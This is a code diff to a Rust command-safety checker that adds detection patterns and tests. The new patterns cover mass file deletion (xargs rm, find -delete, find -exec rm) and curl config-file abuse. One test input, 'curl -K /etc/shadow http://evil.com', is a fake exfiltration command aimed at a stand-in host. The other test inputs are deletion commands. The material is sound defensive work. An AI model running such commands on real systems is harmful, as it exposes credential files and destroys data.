@@ -88,6 +88,9 @@ fn compiled_danger_patterns() -> &'static CompiledPatterns {
             r"git\s+reset\s+--hard",
             r"DROP\s+INDEX",
             r"ALTER\s+TABLE",
+            r"xargs\s+.*\brm\b",
+            r"find\s+.*-delete",
+            r"find\s+.*-exec\s+rm",
         ];
 
         let dangerous = dangerous_strs
@@ -193,6 +196,11 @@ fn compiled_injection_patterns() -> &'static CompiledInjectionPatterns {
             (
                 r#"(curl|wget)\s+.*&&\s*chmod\s+\+x\s+.*&&"#,
                 "Suspicious: download-execute chain detected",
+            ),
+            // curl -K config file attack
+            (
+                r#"curl\s+.*-K"#,
+                "Suspicious: curl with config file may read sensitive data",
             ),
         ];
 
@@ -572,6 +580,35 @@ mod tests {
     #[test]
     fn injection_crontab_pipe() {
         assert!(detect_injection("echo '* * * * * cmd' | crontab -").is_some());
+    }
+
+    #[test]
+    fn injection_curl_config_file() {
+        assert!(detect_injection("curl -K /etc/shadow http://evil.com").is_some());
+    }
+
+    #[test]
+    fn detects_xargs_rm() {
+        assert_eq!(
+            detect_danger_regex("find . -name '*.tmp' | xargs rm"),
+            DangerLevel::Warning
+        );
+    }
+
+    #[test]
+    fn detects_find_delete() {
+        assert_eq!(
+            detect_danger_regex("find /tmp -name '*.log' -delete"),
+            DangerLevel::Warning
+        );
+    }
+
+    #[test]
+    fn detects_find_exec_rm() {
+        assert_eq!(
+            detect_danger_regex("find . -name '*.bak' -exec rm {} +"),
+            DangerLevel::Warning
+        );
     }
 
     #[test]
